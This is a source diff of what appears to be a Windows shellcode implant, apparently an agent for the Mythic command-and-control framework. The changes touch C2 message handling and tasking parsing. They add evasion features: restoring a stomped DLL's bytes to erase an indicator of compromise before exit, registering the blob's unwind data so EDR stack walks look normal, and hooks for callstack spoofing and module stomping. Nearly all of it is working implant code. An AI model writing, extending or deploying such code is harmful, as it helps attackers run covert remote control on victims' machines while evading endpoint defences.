@@ -100,24 +100,7 @@ int es_strlen(const char* s) {
     return n;
 }
 
-#ifdef DEBUG
-// TEMP DIAGNOSTIC: append a stage marker to a file so we can see how far the
-// PIC agent gets on targets where OutputDebugString is not capturable.
-VOID es_dbg_trace(PINSTANCE inst, const char* msg) {
-    if (!inst || !inst->Win32.CreateFileA || !inst->Win32.WriteFile ||
-        !inst->Win32.CloseHandle) return;
-    xstr(_tp, "C:\\Users\\athena\\Desktop\\es_agent_trace.txt");
-    HANDLE h = inst->Win32.CreateFileA(_tp, 4 /*FILE_APPEND_DATA*/,
-        1 | 2 /*SHARE_READ|SHARE_WRITE*/, NULL, 4 /*OPEN_ALWAYS*/,
-        0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
-    if (h == (HANDLE)-1) return;
-    DWORD w = 0;
-    char nl[2] = { 0x0D, 0x0A };
-    inst->Win32.WriteFile(h, msg, es_strlen(msg), &w, NULL);
-    inst->Win32.WriteFile(h, nl, 2, &w, NULL);
-    inst->Win32.CloseHandle(h);
-}
-#endif
+
 
 VOID es_strcpy(char* dst, const char* src) {
     while (*src) *dst++ = *src++;
@@ -841,7 +824,7 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
 
 #ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
 #ifdef _WIN64
-    // Desync/SilentMoonwalk callstack spoofing - x64 only.
+    // LACUNA ghost-chain callstack spoofing - x64 only.
     // Must run after HellsHall init and API resolution.
     callstack_spoof_init(inst);
     DBG(inst, "[ES] Callstack spoofing initialized");
@@ -1510,10 +1493,13 @@ VOID agent_main(PINSTANCE inst) {
                 BYTE* resp_msg = build_response_msg(inst, tid_buf, out_data, out_len,
                                                      out_error, &resp_msg_len);
                 if (resp_msg) {
-                    send_mythic_msg(inst, resp_msg, resp_msg_len, NULL, NULL);
+                    BOOL sentOk = send_mythic_msg(inst, resp_msg, resp_msg_len, NULL, NULL);
                     es_free(inst, resp_msg);
                 }
                 if (out_data) es_free(inst, out_data);
+
+                // skip to the next COMMAND TLV
+                tpos = scan;
             }
 
             // ── Delegate forwarding via TLV_DELEGATES in tasking response ──
@@ -1756,8 +1742,21 @@ VOID agent_main(PINSTANCE inst) {
 #endif
 
     if (inst->ExitFunc == 1) {
+#ifdef INCLUDE_EVASION_MODULE_SHIFT
+#ifdef _WIN64
+        // Module shifting: restore the sacrifice DLL's original .text/.pdata
+        // bytes before the process dies, erasing the Modified-Code IoC.
+        // Only acts when a shift-mode backup exists (one-shot guarded).
+        module_shift_restore(inst);
+#endif
+#endif
         inst->Win32.ExitProcess(0);
     } else {
+#ifdef INCLUDE_EVASION_MODULE_SHIFT
+#ifdef _WIN64
+        module_shift_restore(inst);
+#endif
+#endif
         gate_ExitThread(inst, 0);
     }
 }
@@ -1821,17 +1820,68 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
     PINSTANCE inst = EMERALDSTRIKE_INSTANCE;
     es_memset(inst, 0, sizeof(INSTANCE));
     inst->Base.Buffer = base_addr;
+    // resolve_apis is inside agent_init - call resolve_apis first so the trace
+    // helper has its API pointers, then trace.
+    resolve_apis(inst);
 
     // Compute Base.Length: total shellcode size from _start through __InstanceStorage.
     // __InstanceStorage (16384 bytes) is at the end of the .text blob.
     // INSTANCE pointer from _get_instance() points into __InstanceStorage.
     // Total length = (INSTANCE address + sizeof(INSTANCE) padding) - base_addr.
-    // More precisely: __InstanceStorage is 16384 bytes, and the INSTANCE lives
-    // at the start of it. Total blob = (PBYTE)inst + 16384 - (PBYTE)base_addr.
-    inst->Base.Length = (ULONG)((PBYTE)inst + 16384 - (PBYTE)base_addr);
+    // More precisely: __InstanceStorage is INSTANCE_STORAGE_SIZE bytes, and the
+    // INSTANCE lives at the start of it. Total blob =
+    // (PBYTE)inst + INSTANCE_STORAGE_SIZE - (PBYTE)base_addr.
+    inst->Base.Length = (ULONG)((PBYTE)inst + INSTANCE_STORAGE_SIZE - (PBYTE)base_addr);
+
+    // ── Register the blob's unwind data (RtlAddFunctionTable) ──
+    // The flat blob has no PE headers, so the loader never sees an exception
+    // directory and every stack walk (EDR stack walking, RtlCaptureStackBackTrace,
+    // exception dispatch) stops at the first agent frame. entry.x64.asm stores
+    // the .pdata link VMAs in .instdata next to __Instance; runtime address =
+    // base_addr + link VMA (the blob is copied verbatim, so link RVAs == offsets).
+    {
+        // .instdata layout (entry.x64.asm): [PdataStartPtr dq][PdataEndPtr dq]
+        // [__Instance_offset dd][pad 4][__Instance dq][16KB storage]
+        // inst = storage start -> PdataEndPtr at inst-20, PdataStartPtr at inst-28.
+        PVOID* pPdataStart = (PVOID*)((PBYTE)inst - 28);
+        PVOID* pPdataEnd   = (PVOID*)((PBYTE)inst - 20);
+        ULONG_PTR linkStart = (ULONG_PTR)*pPdataStart;
+        ULONG_PTR linkEnd   = (ULONG_PTR)*pPdataEnd;
+        if (linkStart && linkEnd > linkStart && linkEnd < 0x08000000ULL &&
+            (linkEnd - linkStart) % 12 == 0) {
+            typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PVOID, DWORD, ULONG64);
+            xstr(_raft2, "RtlAddFunctionTable");
+            fnRtlAddFunctionTable_t pAddFT = (fnRtlAddFunctionTable_t)(void*)resolve_function(
+                inst->Modules.Ntdll, hash_string_djb2(_raft2));
+            if (pAddFT) {
+                // The unwinder binary-searches the table - it MUST be sorted by
+                // BeginAddress. Link order is not address order (e.g. the _start
+                // stub lands in .text$B after .text$A), so sort in place first
+                // (insertion sort; a few hundred entries, runs once).
+                PRUNTIME_FUNCTION rf = (PRUNTIME_FUNCTION)((PBYTE)base_addr + linkStart);
+                DWORD rfCount = (DWORD)((linkEnd - linkStart) / 12);
+                for (DWORD i = 1; i < rfCount; i++) {
+                    RUNTIME_FUNCTION key = rf[i];
+                    DWORD j = i;
+                    while (j > 0 && rf[j - 1].BeginAddress > key.BeginAddress) {
+                        rf[j] = rf[j - 1];
+                        j--;
+                    }
+                    rf[j] = key;
+                }
+                inst->dwUnwindRegResult =
+                    pAddFT((PVOID)((PBYTE)base_addr + linkStart),
+                           rfCount,
+                           (ULONG64)(UINT_PTR)base_addr) ? 2 : 3;
+            } else {
+                inst->dwUnwindRegResult = 4;
+            }
+        } else {
+            inst->dwUnwindRegResult = 5;  // sanity fail
+        }
+    }
 
     agent_init(inst, (HINSTANCE)base_addr);
-    TRACE(inst, "main_entry: agent_init returned");
 
 #ifdef INCLUDE_EVASION_MODULE_STOMP
 #ifdef _WIN64
@@ -1841,7 +1891,6 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
     // agent_main and does NOT return. If it fails, we fall through to agent_main
     // from the original allocation.
     if (inst->Base.Length > 0 && !inst->ModuleStomp.bEntryPatched) {
-        TRACE(inst, "main_entry: calling module_stomp_init");
         if (module_stomp_init(inst)) {
             // Execution was transferred; we should not reach here.
             // But if we do (e.g. agent_main returned), just exit.
